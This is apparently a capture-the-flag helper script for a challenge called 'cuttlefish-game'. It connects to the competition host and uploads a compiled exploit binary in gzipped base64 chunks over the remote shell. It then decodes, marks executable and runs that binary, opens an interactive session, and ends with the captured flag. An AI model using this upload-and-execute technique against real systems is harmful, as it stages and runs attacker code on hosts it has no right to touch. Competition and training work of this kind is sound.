"""
Uploads and executes exploit for cuttlefish-game, expects exploit executable to be in a file called
"exploit"

Ideally the exploit has been compiled with musl-gcc to decrease the amount of data we need to send

File upload based on https://github.com/ARESxCyber/pwnkernel/blob/master/helper_scripts/client.py
Changes from original version:
- Turned off remote echo (stty -echo). Previously the server was effectively sending our file back
  to us, as it was echoing each "echo -n ..." chunk back to us.
- run "base64 -d" after all of the parts have been sent and combined. This keeps the sending of
  each individual chunk as quick as possible, and ensures we don't get errors decoding due to
  cutting the base64 stream in a weird place.
"""

import os
import gzip
from pathlib import Path

os.environ["PWNLIB_NOTERM"] = "true"
from pwn import *

def chunks(lst, n):
    for i in range(0, len(lst), n):
        yield lst[i:i + n]


def shell(io, cmd):
    io.sendline(cmd)
    io.recvuntil(b"$")


def send_file(io, file_path, chunk_size=512):
    data = open(file_path, "rb").read()
    data = gzip.compress(data)
    data = b64e(data).encode()

    print(f"SEND FILE {file_path.name} | START ({len(data)}B)")
   
    io.sendline()
    for i, chunk in enumerate(chunks(data, chunk_size)):
        if i == 0:
            print
        shell(io, f"echo -n {chunk.decode()} > {i:08}.part".encode())
        print(".", end="", flush=True)
    print()

    print(f"SEND FILE {file_path.name} | CLEAN UP")

    shell(io, f"cat *.part | base64 -d > {file_path.name}.gz".encode())
    shell(io, f"gzip -d {file_path.name}.gz".encode())
    shell(io, b"rm *.part")
    
    print(f"SEND FILE {file_path.name} | DONE")


io = remote("chals.damctf.xyz", 30456)

print("BOOTING")
io.recvuntil(b"$")

shell(io, b"stty -echo")

exploit_path = Path("./exploit")
send_file(io, exploit_path)

shell(io, b"chmod +x ./exploit")

io.sendline(b"./exploit")

io.interactive()

# dam{a_B1t_0f_4_cl1ch3d_r3f4reNc3}
